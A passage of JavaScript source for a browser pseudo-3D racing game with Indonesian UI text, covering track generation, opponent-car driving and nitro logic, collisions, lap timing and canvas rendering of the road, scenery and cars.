    addRoad(16, 50, 16,  0,    0);
    addRoad(18, 48, 18,  1.6,  90);
    addRoad(22, 58, 22, -7.6, -20);
    addRoad(16, 35, 16,  5.0,  40);
    addRoad(16, 35, 16, -5.0,  30);
    addRoad(16, 28, 16,  0,    50);
    addRoad(22, 52, 22,  7.4, -130);
    addRoad(20, 42, 20, -7.0,  -55);
    addRoad(20, 120, 20, 0,    10);
    addRoad(16, 38, 16,  3.8,   0);
    addRoad(16, 28, 16, -7.0, -12);
    addRoad(16, 28, 16,  7.0,  12);
    addRoad(14, 25, 14, -5.5,   0);
    addRoad(26, 85, 26, -4.6,  45);
    addRoad(16, 38, 16,  1.8, -75);
    addRoad(16, 38, 16, -2.2,  65);
    addRoad(18, 36, 18,  4.8,  15);
    addRoad(18, 48, 18,  6.6, -20);
    addRoad(16, 32, 16, -5.2,   0);
    addRoad(16, 32, 16,  5.2,   0);
    addRoad(18, 42, 18, -6.8,   0);
    addRoad(16, 26, 16, -7.8,  -8);
    addRoad(16, 26, 16,  7.8,   8);
    addRoad(20, 85, 20,  0,     0);
    trackLen=segments.length*SEG;
    var N=segments.length,i;
    for(i=8;i<N;i+=4){
        var h=frac(Math.sin(i*127.1)*43758.5);
        var side=(i%8<4)?-1:1;
        if(!treesBy[i])treesBy[i]=[];
        treesBy[i].push({off:side*(1.6+h*1.3),type:(i%3),sc:0.85+h*0.5});
    }
    for(i=15;i<N;i++){
        var cv=segments[i].curve;
        if(Math.abs(cv)>2.8&&(i%8)===0){
            var out=cv>0?-1.36:1.36;
            signsBy[i]={off:out,dir:cv>0?1:-1,type:0};
        }else if(Math.abs(cv)<0.3&&(i%36)===0&&i>35){
            signsBy[i]={off:(i%72===0?-1.44:1.44),dir:0,type:1,col:ri(0,3)};
        }
        var aheadCv=Math.abs(segments[(i+24)%N].curve);
        if(aheadCv>5.0&&Math.abs(cv)<0.8){
            if((i%18)===0)signsBy[i]={off:-1.38,dir:0,type:2,txt:'150m'};
            else if((i%18)===6)signsBy[i]={off:-1.38,dir:0,type:2,txt:'100m'};
            else if((i%18)===12)signsBy[i]={off:-1.38,dir:0,type:2,txt:'50m'};
        }
    }
}
function segIdxAt(z){
    var i=Math.floor(z/SEG)%segments.length;
    if(i<0)i+=segments.length;
    return i;
}
 
var state='menu',gt=0,last=0;
var position=0,playerX=0,speed=0;
var lap=1,raceT=0,lapStart=0,lapTimes=[];
var bestLap=null;
var nitro=1,nitroOn=false,nitroPrev=false;
var steerL=false,steerR=false,brakeHeld=false,nitroHeld=false;
var cars=[];
var rank=6,prevRank=6,finishRank=6,endT=0;
var cd=0,cdNum=-1;
var shakeT=0,skyX=0;
var particles=[];
var banner=null,otPop=null;
var fs=[];
var errMsg=null;
var slipping=false;
 
var maxSpeed=24000;
var ACCEL=maxSpeed/2.0;
 
var FOGC=[186,214,238];
var GRASS=[98,162,78];
var ROAD1=[88,92,101],ROAD2=[84,88,97];
var RUM1=[235,235,240],RUM2=[204,62,52];
var LANE=[240,240,246];
var PLAYER_COL=[222,52,46];
var AI_COLS=[[62,130,220],[242,202,62],[72,172,92],[164,92,202],[232,236,242]];
 
try{
    var bl=parseFloat(localStorage.getItem('br3d_bl'));
    if(bl>0)bestLap=bl;
}catch(e){}
function saveBest(){
    try{localStorage.setItem('br3d_bl',String(bestLap));}catch(e){}
}
 
var fogA=[];
function buildFog(){
    fogA=[];
    for(var n=0;n<DRAW;n++)
        fogA[n]=clamp((n-70)/105,0,0.6);
}
buildFog();
 
function resize(){
    W=400;
    H=520;
    dpr=Math.min(window.devicePixelRatio||1,2);
    canvas.width=Math.floor(W*dpr);
    canvas.height=Math.floor(H*dpr);
    ctx.setTransform(dpr,0,0,dpr,0,0);
}
window.addEventListener('resize',resize);
window.addEventListener('orientationchange',function(){
    setTimeout(resize,300);
});
 
function setBanner(t,sub,dur,color,size){
    banner={text:t,sub:sub||'',t:0,
        dur:(typeof dur==='number'&&dur>0)?dur:1.0,
        color:color||'#ffd23f',size:size||44};
}
function initCars(){
    cars=[];
    var aiDefs=[
        {num:12,name:'Vortex Blue',lane:-0.36,bias:-0.24,z:4000, top:0.88,col:AI_COLS[0]},
        {num:7, name:'Viper Gold',  lane:0.34, bias:0.24, z:9500, top:0.91,col:AI_COLS[1]},
        {num:33,name:'Emerald GT',  lane:-0.26,bias:-0.14,z:16000,top:0.94,col:AI_COLS[2]},
        {num:99,name:'Phantom Violet',lane:0.28,bias:0.18,z:23500,top:0.97,col:AI_COLS[3]},
        {num:18,name:'Apex Silver', lane:-0.14,bias:0.02, z:32000,top:0.99,col:AI_COLS[4]}
    ];
    for(var i=0;i<5;i++){
        var d=aiDefs[i];
        cars.push({
            num:d.num,name:d.name,
            z:d.z,x:d.lane,laneBias:d.bias,
            col:d.col,top:d.top,
            spd:0,dist:d.z,
            ph:rnd(0,TAU),bump:0,brake:false,
            nitro:false,steer:0,
            nitroGauge:1.0,
            nitroTimer:0,
            nitroCd:rnd(2.5,5.5)
        });
    }
}
function startRace(){
    over.classList.add('hidden');
    position=0;playerX=0;speed=0;
    lap=1;raceT=0;lapStart=0;lapTimes=[];
    nitro=1;nitroOn=false;
    rank=6;prevRank=6;finishRank=6;
    particles=[];otPop=null;
    slipping=false;
    initCars();
    state='count';
    cd=3.0;
    cdNum=-1;
    AU.resume();
    AU.setMusicVol(1);
    AU.engineOn();
    AU.engine(0.15,true,false);
}
function finishRace(){
    state='finished';
    finishRank=rank;
    endT=1.4;
    AU.fanfare();
    AU.setMusicVol(0.5);
    setBanner('FINISH!','',1.2,'#ffd23f',54);
}
function showCard(){
    ovTitle.textContent=finishRank===1?'JUARA! 🏆':
        (finishRank<=3?'PODIUM! 🥉':'FINISH!');
    ovPos.textContent='P'+finishRank;
    ovTime.textContent=fmtT(raceT);
    var bl=lapTimes.length?Math.min.apply(null,lapTimes):0;
    ovBest.textContent=fmtT(bl);
    newTag.style.display='none';
    if(bl&&(!bestLap||bl<bestLap)){
        bestLap=bl;
        saveBest();
        newTag.style.display='inline-block';
    }
    over.classList.remove('hidden');
}
function toMenu(){
    over.classList.add('hidden');
    state='menu';
    speed=0;
    AU.setMusicVol(0.45);
    AU.engine(0,false,false);
}
 
function wrapZ(v){
    v=v%trackLen;
    if(v<0)v+=trackLen;
    return v;
}
function shortestDz(a,b){
    var d=wrapZ(a)-wrapZ(b);
    if(d>trackLen/2)d-=trackLen;
    if(d<-trackLen/2)d+=trackLen;
    return d;
}
function updateAI(dt){
    var pDist=(lap-1)*trackLen+position;
    var i,j;
    for(i=0;i<cars.length;i++){
        var c=cars[i];
        c.bump-=dt;
        var seg=segments[segIdxAt(c.z)];
        var curveSev=Math.abs(seg.curve);
        var target=c.top*maxSpeed;
 
        if(curveSev>2.5){
            target*=(1-Math.min(0.35,curveSev*0.052));
        }
 
        if(c.dist<pDist-35000)target*=1.10;
        if(c.dist>pDist+30000)target*=0.88;
 
        if(c.nitroTimer>0){
            c.nitroTimer-=dt;
            c.nitroGauge=Math.max(0,c.nitroGauge-dt/2.6);
            if(c.nitroTimer<=0||c.nitroGauge<=0.04){
                c.nitroTimer=0;
                c.nitro=false;
                c.nitroCd=rnd(6.0,11.0);
            }else{
                c.nitro=true;
            }
        }else{
            c.nitro=false;
            c.nitroCd-=dt;
            c.nitroGauge=Math.min(1.0,c.nitroGauge+dt/9.0);
        }
 
        var behindDist=pDist-c.dist;
        var aheadDist=c.dist-pDist;
 
        if(state==='race'&&c.nitroTimer<=0&&c.nitroCd<=0&&c.nitroGauge>0.40){
            var triggerNit=false;
            if(behindDist>80&&behindDist<3600&&curveSev<3.0){
                triggerNit=true;
            }
            else if(aheadDist>0&&aheadDist<1800&&(nitroOn||speed>maxSpeed*0.92)){
                triggerNit=true;
            }
            else if(curveSev<2.4){
                for(j=0;j<cars.length;j++){
                    if(j===i)continue;
                    var dzAiCheck=shortestDz(cars[j].z,c.z);
                    if(dzAiCheck>120&&dzAiCheck<1600&&Math.abs(cars[j].x-c.x)<0.55){
                        triggerNit=true;break;
                    }
                }
            }
            if(!triggerNit&&curveSev<0.6&&c.spd>maxSpeed*0.72&&Math.random()<0.03){
                triggerNit=true;
            }
 
            if(triggerNit){
                c.nitroTimer=rnd(1.8,2.7);
                c.nitro=true;
                var dzHear=Math.abs(shortestDz(c.z,position));
                if(dzHear<2800)AU.aiNitro();
            }
        }
 
        if(c.nitro){
            target=Math.max(target,maxSpeed*(c.top*1.34));
        }else if(behindDist>0&&behindDist<4200){
            target=Math.max(target,speed*1.04);
        }
 
        if(state==='count')target=0;
        c.brake=(target<c.spd-450&&!c.nitro);
        var accelRate=c.nitro?3.6:(c.brake?2.4:1.3);
        c.spd+=(target-c.spd)*Math.min(1,dt*accelRate);
        c.z=wrapZ(c.z+c.spd*dt);
        c.dist+=c.spd*dt;
 
        var apexX=(seg.curve>1.5)?-0.45:((seg.curve<-1.5)?0.45:0);
        var wander=Math.sin(gt*0.6+c.ph)*0.14;
        var tx=apexX*0.55+c.laneBias+wander*0.20+c.x*0.1;
 
        if(behindDist>0&&behindDist<2600){
            tx=(playerX>0)?-0.54:0.54;
        }
 
        for(j=0;j<cars.length;j++){
            if(j===i)continue;
            var o=cars[j];
            var dzO=shortestDz(o.z,c.z);
            if(dzO>0&&dzO<2200){
                if(Math.abs(o.x-c.x)<0.48){
                    var passSide=(o.x>0)?-0.52:0.52;
                    tx=clamp(o.x+passSide,-0.80,0.80);
                    if(Math.abs(tx-o.x)<0.36)target=Math.min(target,o.spd*0.96);
                }
            }
        }
 
        var dzP=shortestDz(c.z,position);
        if(dzP>-2800&&dzP<0&&Math.abs(c.x-playerX)<0.44){
            if(nitroOn||speed>maxSpeed*1.08){
                tx=c.x+(c.x>0?-0.42:0.42);
            }else{
                tx=c.x+(playerX>c.x?0.36:-0.36);
            }
        }
 
        var steerAmt=clamp(tx-c.x,-1.8*dt,1.8*dt);
        c.x+=steerAmt;
        c.x=clamp(c.x,-0.82,0.82);
        c.steer=clamp(steerAmt*12,-1,1);
    }
 
    for(i=0;i<cars.length;i++){
        for(j=i+1;j<cars.length;j++){
            var c1=cars[i];
            var c2=cars[j];
            var dzPair=shortestDz(c2.z,c1.z);
            var absDz=Math.abs(dzPair);
            var absDx=Math.abs(c2.x-c1.x);
 
            if(absDz<350){
                if(absDx<0.46){
                    var overlapX=0.46-absDx;
                    var dirX=(c1.x<=c2.x)?-1:1;
                    c1.x=clamp(c1.x+dirX*overlapX*0.54,-0.84,0.84);
                    c2.x=clamp(c2.x-dirX*overlapX*0.54,-0.84,0.84);
 
                    if(absDz<180){
                        var overlapZ=180-absDz;
                        if(dzPair>=0){
                            c1.z=wrapZ(c1.z-overlapZ*0.52);
                            c2.z=wrapZ(c2.z+overlapZ*0.52);
                            c1.dist-=overlapZ*0.52;
                            c2.dist+=overlapZ*0.52;
                            c1.spd=Math.min(c1.spd,c2.spd*0.95);
                        }else{
                            c2.z=wrapZ(c2.z-overlapZ*0.52);
                            c1.z=wrapZ(c1.z+overlapZ*0.52);
                            c2.dist-=overlapZ*0.52;
                            c1.dist+=overlapZ*0.52;
                            c2.spd=Math.min(c2.spd,c1.spd*0.95);
                        }
                        c1.bump=0.25;
                        c2.bump=0.25;
                    }
                }
            }
        }
    }
 
    for(i=0;i<cars.length;i++){
        c=cars[i];
        if(c.bump>0)continue;
        var dz2=shortestDz(c.z,position);
        if(Math.abs(dz2)>160)continue;
        if(Math.abs(c.x-playerX)>0.38)continue;
        c.bump=0.4;
        var side=(playerX<c.x)?-1:1;
        playerX=clamp(playerX+side*0.16,-1.65,1.65);
        c.x=clamp(c.x-side*0.14,-0.85,0.85);
        shakeT=0.25;
        AU.thud();
        for(var s=0;s<9;s++)
            particles.push({x:W/2+rnd(-30,30),y:H*0.84+rnd(-10,10),
                vx:rnd(-180,180),vy:rnd(-220,-60),
                g:700,size:rnd(1.5,3.5),life:1,
                decay:rnd(1.5,2.5),color:'#ffd97a'});
        if(dz2>0){
            if(speed>c.spd)speed=c.spd+(speed-c.spd)*0.45;
        }else{
            c.spd*=0.78;
        }
    }
}
 
var rumbleT2=0,skidT=0,smokeT=0;
function update(dt){
    var i;
    if(banner){banner.t+=dt;if(banner.t>=banner.dur)banner=null;}
    if(otPop){otPop.t+=dt;if(otPop.t>1.3)otPop=null;}
    if(shakeT>0)shakeT-=dt*1.6;
    for(i=particles.length-1;i>=0;i--){
        var p=particles[i];
        p.vy+=p.g*dt;
        p.x+=p.vx*dt;p.y+=p.vy*dt;
        p.life-=p.decay*dt;
        if(p.life<=0)particles.splice(i,1);
    }
 
    var seg=segments[segIdxAt(position)];
    var spdPct=clamp(speed/maxSpeed,0,1.25);
 
    if(state==='menu'){
        position=wrapZ(position+3200*dt);
        skyX+=seg.curve*0.02*dt;
        AU.engine(0,false,false);
        return;
    }
    if(state==='count'){
        cd-=dt*1.45;
        var n=Math.ceil(cd);
        if(cd>0&&n!==cdNum&&n<=3){
            cdNum=n;
            AU.beep(n);
        }
        AU.engine(0.25+0.15*Math.sin(gt*9),true,false);
        updateAI(dt);
        if(cd<=0){
            state='race';
            setBanner('GO!','',0.75,'#7ce87c',64);
            AU.go();
        }
        return;
    }
    if(state==='race'||state==='finished'){
        raceT+=dt;
 
        nitroPrev=nitroOn;
        nitroOn=(state==='race')&&nitroHeld&&nitro>0.02;
        if(nitroOn){
            if(!nitroPrev){
                speed=Math.min(maxSpeed*1.70,speed+5000);
                shakeT=0.28;
                AU.nitroOn();
            }
            nitro=Math.max(0,nitro-dt/3.2);
            shakeT=Math.max(shakeT,0.09);
            for(var np=0;np<2;np++){
                particles.push({x:W/2+rnd(-18,18),y:H*0.88,
                    vx:rnd(-60,60),vy:rnd(160,360),g:90,
                    size:rnd(3,6),life:1,decay:rnd(2.5,4),
                    color:Math.random()<0.45?'#00f0ff':(Math.random()<0.75?'#ff9a3d':'#ffd23f')});
            }
        }else{
            nitro=Math.min(1,nitro+dt/6.5);
        }
 
        slipping=false;
        if(state==='race'&&!brakeHeld){
            for(i=0;i<cars.length;i++){
                var dzs=shortestDz(cars[i].z,position);
                if(dzs>200&&dzs<1800&&Math.abs(cars[i].x-playerX)<0.42){
                    slipping=true;
                    break;
                }
            }
        }
 
        var curMax=maxSpeed*(nitroOn?1.70:1);
        if(state==='finished')curMax=Math.min(curMax,2500);
        if(state==='race'){
            if(brakeHeld)speed-=maxSpeed*1.8*dt;
            else if(nitroOn)speed+=ACCEL*4.2*dt;
            else if(speed>maxSpeed)speed-=maxSpeed*0.8*dt;
            else speed+=ACCEL*(slipping?1.6:1)*dt;
        }else{
            speed-=maxSpeed*0.5*dt;
        }
        speed=clamp(speed,0,curMax);
 
        var offroad=Math.abs(playerX)>0.96;
        if(offroad&&state==='race'){
            if(speed>maxSpeed*0.4)
                speed+=(maxSpeed*0.4-speed)*Math.min(1,dt*2.5);
            shakeT=Math.max(shakeT,0.12);
            rumbleT2-=dt;
            if(rumbleT2<=0){rumbleT2=0.09;AU.rumble();}
            if(Math.random()<0.6)
                particles.push({x:W/2+rnd(-60,60),y:H*0.88,
                    vx:rnd(-70,70),vy:rnd(-160,-40),g:500,
                    size:rnd(2,5),life:1,decay:rnd(1.8,3),
                    color:'#b8a084'});
        }
 
        var steer=(steerR?1:0)-(steerL?1:0);
        var spdRatio=clamp(speed/maxSpeed,0,1.7);
 
        var steerPower=6.0*(0.65+0.35*Math.min(spdRatio,1.25));
        playerX+=steer*dt*steerPower;
 
        var centrifugal=seg.curve*spdRatio*0.22;
        playerX-=centrifugal*dt;
 
        playerX=clamp(playerX,-1.85,1.85);
        skyX+=(seg.curve*spdRatio*0.0035+steer*0.0032)*dt;
 
        if(Math.abs(seg.curve)>3.2&&spdPct>0.62){
            skidT-=dt;
            if(skidT<=0){skidT=0.13;AU.skid();}
            smokeT-=dt;
            if(smokeT<=0){
                smokeT=0.06;
                var pw=clamp(W*0.34,100,160);
                particles.push({
                    x:W/2+(steer>0?-1:1)*pw*0.32+rnd(-8,8),
                    y:H*0.9,
                    vx:rnd(-50,50),vy:rnd(-130,-40),g:180,
                    size:rnd(3,7),life:1,decay:rnd(1.4,2.2),
                    color:'#cfd4da'});
            }
        }
 
        var prevPos=position;
        position=wrapZ(position+speed*dt);
        if(state==='race'&&position<prevPos){
            lap++;
            if(lap>1){
                var lt=raceT-lapStart;
                lapTimes.push(lt);
                var isRec=(!bestLap||lt<bestLap);
                if(isRec){bestLap=lt;saveBest();}
                AU.lap();
                if(lap<=LAPS)
                    setBanner('LAP '+lap+'/'+LAPS,
                        'Lap: '+fmtT(lt)+(isRec?' — REKOR!':''),
                        1.3,isRec?'#7ce87c':'#ffd23f',44);
            }
            lapStart=raceT;
            if(lap===LAPS)
                setBanner('LAP TERAKHIR!','Gas pol!',1.1,'#ff9a3d',44);
            if(lap>LAPS)finishRace();
        }
 
        updateAI(dt);
 
        var pDist=(lap-1)*trackLen+position;
        rank=1;
        for(i=0;i<cars.length;i++)
            if(cars[i].dist>pDist)rank++;
        if(state==='race'&&raceT>2){
            if(rank<prevRank){
                var passedCar=cars.find(function(c){return Math.abs(c.dist-pDist)<4000;});
                var cName=passedCar?passedCar.name.toUpperCase():'RIVAL';
                otPop={txt:'⚡ MENYALIP '+cName+'! → P'+rank,color:'#7ce87c',t:0};
                AU.overtake();
            }else if(rank>prevRank){
                var overtakingCar=cars.find(function(c){return Math.abs(c.dist-pDist)<4000;});
                var oName=overtakingCar?overtakingCar.name.toUpperCase():'RIVAL';
                var isNitOver=overtakingCar&&overtakingCar.nitro;
                otPop={
                    txt:(isNitOver?'⚡ NITRO ATTACK! ':'⚔️ DISALIP ')+oName+'! → P'+rank,
                    color:isNitOver?'#00f0ff':'#ff6b6b',
                    t:0
                };
                AU.passed();
            }
        }
        prevRank=rank;
 
        if(topLap)topLap.textContent=Math.min(lap,LAPS)+'/'+LAPS;
        if(topPos)topPos.textContent='P'+rank;
 
        AU.engine(spdPct,state!=='menu',nitroOn);
 
        if(state==='finished'){
            endT-=dt;
            if(endT<=0&&over.classList.contains('hidden'))showCard();
        }
    }
}
 
function drawSky(){
    var g=ctx.createLinearGradient(0,0,0,H*0.5+8);
    g.addColorStop(0,'#3f8ed6');
    g.addColorStop(0.6,'#8ccaf2');
    g.addColorStop(1,'#d9efff');
    ctx.fillStyle=g;
    ctx.fillRect(0,0,W,H*0.5+8);
    var sx=W*0.7,sy=H*0.1;
    var sg=ctx.createRadialGradient(sx,sy,5,sx,sy,55);
    sg.addColorStop(0,'#fffbe8');
    sg.addColorStop(0.3,'#ffe9a0');
    sg.addColorStop(1,'rgba(255,220,120,0)');
    ctx.fillStyle=sg;
    ctx.fillRect(sx-60,sy-60,120,120);
    ctx.fillStyle='rgba(255,255,255,0.85)';
    for(var c=0;c<3;c++){
        var cx=((c*180+gt*7+c*40)%(W+180))-90;
        var cy=H*0.09+c*15;
        ctx.beginPath();
        ctx.ellipse(cx,cy,42,9,0,0,TAU);
        ctx.ellipse(cx+26,cy-5,28,7,0,0,TAU);
        ctx.fill();
    }
    var hy=H*0.5;
    var o1=((skyX*1.4)%(W+80)+(W+80))%(W+80);
    ctx.fillStyle='#7f96b8';
    ctx.beginPath();
    ctx.moveTo(0,hy+6);
    for(var x=0;x<=W;x+=20)
        ctx.lineTo(x,hy+6-(30+Math.sin((x+o1)*0.013)*16+Math.sin((x+o1)*0.03)*7));
    ctx.lineTo(W,hy+6);ctx.closePath();ctx.fill();
    var o2=((skyX*0.8)%(W+80)+(W+80))%(W+80);
    ctx.fillStyle='#5d7494';
    ctx.beginPath();
    ctx.moveTo(0,hy+6);
    for(var x2=0;x2<=W;x2+=20)
        ctx.lineTo(x2,hy+6-(18+Math.sin((x2+o2)*0.017)*11+Math.sin((x2+o2)*0.04)*5));
    ctx.lineTo(W,hy+6);ctx.closePath();ctx.fill();
    var fg=ctx.createLinearGradient(0,hy,0,hy+30);
    fg.addColorStop(0,'rgba(186,214,238,0.85)');
    fg.addColorStop(1,'rgba(186,214,238,0)');
    ctx.fillStyle=fg;
    ctx.fillRect(0,hy,W,30);
}
 
function renderRoad(){
    var N=segments.length;
    var baseI=segIdxAt(position);
    var base=segments[baseI];
    var basePct=(position%SEG)/SEG;
    var worldY=lerp(base.y1,base.y2,basePct);
    var camX=playerX*ROADW;
    var curCamH=CAMH-(speed/maxSpeed)*130-(nitroOn?180:0);
    var camY=curCamH+worldY;
    var curCamDepth=nitroOn?0.64:(camDepth-(speed/maxSpeed)*0.12);
    var W2=W/2,H2=H/2;
    var x=0,dx=-(base.curve*basePct);
    var maxY=H+60;
    fs.length=0;
 
    for(var n=0;n<DRAW;n++){
        var idx=(baseI+n)%N;
        var seg=segments[idx];
        var looped=idx<baseI;
        var zoff=looped?trackLen:0;
        var wz1=idx*SEG+zoff;
        var d1=wz1-position,d2=d1+SEG;
        var wx1=x,wx2=x+dx;
        var s1=curCamDepth/Math.max(d1,0.5);
        var s2=curCamDepth/Math.max(d2,0.5);
        var e={
            idx:idx,n:n,d1:d1,clip:maxY,fog:fogA[n],
            x1:W2+s1*(wx1-camX)*W2,
            y1:H2-s1*(seg.y1-camY)*H2,
            w1:s1*ROADW*W2,
            x2:W2+s2*(wx2-camX)*W2,
            y2:H2-s2*(seg.y2-camY)*H2,
            w2:s2*ROADW*W2
        };
        fs.push(e);
        x+=dx;
        dx+=seg.curve;
 
        if(d1<=curCamDepth)continue;
        if(e.y2>=e.y1)continue;
        if(e.y2>=maxY)continue;
 
        var alt=(idx%2)===0;
        var fog=fogA[n];
 
        var y1o=e.y1+1;
 
        ctx.fillStyle=rgbS(mixc(GRASS,FOGC,fog));
        ctx.fillRect(0,e.y2,W,y1o-e.y2);
        var rc=mixc(alt?RUM1:RUM2,FOGC,fog);
        ctx.fillStyle=rgbS(rc);
        qf([e.x1-e.w1*1.12,y1o],[e.x1-e.w1,y1o],
           [e.x2-e.w2,e.y2],[e.x2-e.w2*1.12,e.y2]);
        qf([e.x1+e.w1,y1o],[e.x1+e.w1*1.12,y1o],
           [e.x2+e.w2*1.12,e.y2],[e.x2+e.w2,e.y2]);
        ctx.fillStyle=rgbS(mixc(alt?ROAD1:ROAD2,FOGC,fog));
        qf([e.x1-e.w1,y1o],[e.x1+e.w1,y1o],
           [e.x2+e.w2,e.y2],[e.x2-e.w2,e.y2]);
        if(idx<2||idx>=N-2){
            ctx.fillStyle=rgbS(mixc([235,235,235],FOGC,fog));
            for(var ch=0;ch<8;ch+=2){
                var a1=-1+ch/4,b1=-1+(ch+1)/4;
                qf([e.x1+e.w1*a1,y1o],[e.x1+e.w1*b1,y1o],
                   [e.x2+e.w2*b1,e.y2],[e.x2+e.w2*a1,e.y2]);
            }
        }
        else if(alt){
            ctx.fillStyle=rgbS(mixc(LANE,FOGC,fog));
            for(var l=1;l<3;l++){
                var f=-1+2*l/3;
                qf([e.x1+e.w1*f-e.w1*0.012,y1o],
                   [e.x1+e.w1*f+e.w1*0.012,y1o],
                   [e.x2+e.w2*f+e.w2*0.012,e.y2],
                   [e.x2+e.w2*f-e.w2*0.012,e.y2]);
            }
        }
        maxY=e.y2;
    }
}
 
function drawTree(x,by,w,fog,type){
    var h=w*1.2;
    ctx.fillStyle=rgbS(mixc([92,64,38],FOGC,fog));
    ctx.fillRect(x-w*0.05,by-h*0.36,w*0.10,h*0.36);
    var g1=mixc([46,110,54],FOGC,fog);
    var g2=mixc([34,88,46],FOGC,fog);
    if(type===2){
        ctx.fillStyle=rgbS(g1);
        ctx.beginPath();ctx.arc(x,by-h*0.56,w*0.34,0,TAU);ctx.fill();
        ctx.fillStyle=rgbS(g2);
        ctx.beginPath();ctx.arc(x-w*0.13,by-h*0.45,w*0.22,0,TAU);ctx.fill();
        ctx.beginPath();ctx.arc(x+w*0.13,by-h*0.45,w*0.22,0,TAU);ctx.fill();
    }else{
        for(var k=0;k<3;k++){
            var fy=by-h*(0.30+k*0.23);
            var r=w*(0.34-k*0.07);
            ctx.fillStyle=rgbS(k%2?g2:g1);
            ctx.beginPath();
            ctx.moveTo(x,fy-r*1.5);
            ctx.lineTo(x-r,fy);
            ctx.lineTo(x+r,fy);
            ctx.closePath();ctx.fill();
        }
    }
}
 
function drawSign(e,s){
    var w=e.w1;
    if(w<26)return;
    var x=e.x1+s.off*w;
    var y=e.y1;
    var fog=e.fog;
    var sw,sh,ph;
    if(s.type===0){
        sw=w*0.22;sh=sw*0.55;ph=w*0.30;
    }else if(s.type===2){
        sw=w*0.20;sh=sw*0.52;ph=w*0.28;
    }else{
        sw=w*0.32;sh=sw*0.60;ph=w*0.38;
    }
    ctx.fillStyle=rgbS(mixc([120,124,130],FOGC,fog));
    ctx.fillRect(x-sw*0.06,y-ph,Math.max(1.5,sw*0.12),ph);
    if(s.type===0){
        ctx.fillStyle=rgbS(mixc([206,52,40],FOGC,fog));
        rrect(x-sw/2,y-ph-sh,sw,sh,sw*0.06);ctx.fill();
        ctx.fillStyle=rgbS(mixc([245,245,245],FOGC,fog));
        for(var k=0;k<2;k++){
            var ax=x-sw*0.26+k*sw*0.34;
            ctx.beginPath();
            if(s.dir>0){
                ctx.moveTo(ax-sw*0.09,y-ph-sh*0.84);
                ctx.lineTo(ax+sw*0.09,y-ph-sh*0.5);
                ctx.lineTo(ax-sw*0.09,y-ph-sh*0.16);
            }else{
                ctx.moveTo(ax+sw*0.09,y-ph-sh*0.84);
                ctx.lineTo(ax-sw*0.09,y-ph-sh*0.5);
                ctx.lineTo(ax+sw*0.09,y-ph-sh*0.16);
            }
            ctx.closePath();ctx.fill();
        }
    }else if(s.type===2){
        ctx.fillStyle=rgbS(mixc([245,245,250],FOGC,fog));
        rrect(x-sw/2,y-ph-sh,sw,sh,sw*0.06);ctx.fill();
        ctx.fillStyle=rgbS(mixc([20,24,32],FOGC,fog));
        txt(s.txt||'100m',x,y-ph-sh/2,Math.max(7,sh*0.48),rgbS(mixc([20,24,32],FOGC,fog)),null,0);
    }else{
        var cols=[[255,170,40],[70,150,230],[240,240,245],[90,200,110]];
        ctx.save();
        rrect(x-sw/2,y-ph-sh,sw,sh,sw*0.05);
        ctx.clip();
        ctx.fillStyle=rgbS(mixc(cols[s.col],FOGC,fog));
        ctx.fillRect(x-sw/2,y-ph-sh,sw,sh*0.62);
        ctx.fillStyle=rgbS(mixc([40,44,52],FOGC,fog));
        ctx.fillRect(x-sw/2,y-ph-sh*0.44,sw,sh*0.44);
        ctx.fillStyle=rgbS(mixc([250,250,252],FOGC,fog));
        ctx.fillRect(x-sw*0.38,y-ph-sh*0.78,sw*0.5,sh*0.16);
        ctx.restore();
    }
}
 
function drawGantry(e,title){
    if(e.w1<22)return;
    var fog=e.fog;
    var xl=e.x1-e.w1*1.10,xr=e.x1+e.w1*1.10;
    var y=e.y1;
    var h=e.w1*0.72;
    var pw=Math.max(2,e.w1*0.05);
    ctx.fillStyle=rgbS(mixc([70,76,84],FOGC,fog));
    ctx.fillRect(xl-pw/2,y-h,pw,h);
    ctx.fillRect(xr-pw/2,y-h,pw,h);
    var bh=e.w1*0.14;
    var by=y-h;
    var bw=(xr-xl)+pw;
    ctx.fillStyle=rgbS(mixc([232,234,238],FOGC,fog));
    ctx.fillRect(xl-pw/2,by-bh,bw,bh);
    ctx.fillStyle=rgbS(mixc([28,30,36],FOGC,fog));
    var cells=12,k;
    for(k=0;k<cells;k++){
        if(k%2)continue;
        ctx.fillRect(xl-pw/2+bw*k/cells,by-bh,bw/cells+0.5,bh);
    }
    for(k=0;k<cells;k++){
        if(k%2===0)continue;
        ctx.fillRect(xl-pw/2+bw*k/cells,by-bh*0.5,bw/cells+0.5,bh*0.5);
    }
    if(e.w1>38)
        txt(title||'FINISH',(xl+xr)/2,by-bh/2,Math.max(8,bh*0.54),
            '#ffd23f','#1a2233',3);
}
 
function drawCar(x,by,w,col,brake,nit,steer,fog,isPlayer,num){
    var h=w*0.58;
    ctx.save();
    ctx.translate(x,by);
    if(steer)ctx.rotate(steer*0.095);
 
    var dark=rgbS(mixc([22,24,30],FOGC,fog));
    var carbon=rgbS(mixc([28,32,40],FOGC,fog));
    var bodyCol=rgbS(mixc(col,FOGC,fog*0.6));
    var bodyDark=rgbS(mixc(mixc(col,[0,0,0],0.32),FOGC,fog*0.6));
    var bodyLight=rgbS(mixc(mixc(col,[255,255,255],0.28),FOGC,fog*0.6));
 
    ctx.fillStyle='rgba(10,14,22,0.38)';
    ctx.beginPath();ctx.ellipse(0,3,w*0.56,w*0.11,0,0,TAU);ctx.fill();
    ctx.fillStyle='rgba(8,10,16,0.6)';
    ctx.beginPath();ctx.ellipse(-w*0.48,2,w*0.13,w*0.05,0,0,TAU);ctx.fill();
    ctx.beginPath();ctx.ellipse(w*0.48,2,w*0.13,w*0.05,0,0,TAU);ctx.fill();
 
    ctx.fillStyle=dark;
    rrect(-w*0.58,-h*0.36,w*0.20,h*0.38,Math.max(2,w*0.025));ctx.fill();
    rrect(w*0.38,-h*0.36,w*0.20,h*0.38,Math.max(2,w*0.025));ctx.fill();
 
    if(w>24){
        var rotorCol=brake?'rgba(255,110,30,0.9)':rgbS(mixc([160,166,176],FOGC,fog));
        ctx.fillStyle=rotorCol;
        ctx.beginPath();ctx.arc(-w*0.48,-h*0.18,Math.max(2,w*0.065),0,TAU);ctx.fill();
        ctx.beginPath();ctx.arc(w*0.48,-h*0.18,Math.max(2,w*0.065),0,TAU);ctx.fill();
        ctx.fillStyle='#e63946';
        ctx.fillRect(-w*0.53,-h*0.23,Math.max(1.5,w*0.022),Math.max(2.5,h*0.09));
        ctx.fillRect(w*0.505,-h*0.23,Math.max(1.5,w*0.022),Math.max(2.5,h*0.09));
    }
 
    ctx.fillStyle=rgbS(mixc([44,48,58],FOGC,fog));
